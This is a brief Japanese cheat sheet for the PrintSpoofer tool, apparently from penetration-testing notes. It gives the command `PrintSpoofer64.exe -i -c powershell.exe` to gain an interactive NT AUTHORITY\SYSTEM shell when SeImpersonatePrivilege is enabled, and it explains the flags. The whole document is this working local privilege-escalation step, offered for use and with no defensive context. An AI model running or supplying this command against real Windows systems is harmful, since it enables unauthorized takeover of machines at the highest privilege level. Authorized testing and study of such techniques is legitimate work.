# PrintSpoofer

## コマンド集

1. SeImpersonatePrivilegeが有効なとき、NT AUTHORITY|SYSTEMでシェルを取得する。  
   -i => 現在のプロセスと現在のセッションで対話する。  
   -c => 引数にpowershell.exeを入力して実行するコマンドを指定する。
```
.\PrintSpoofer64.exe -i -c powershell.exe
```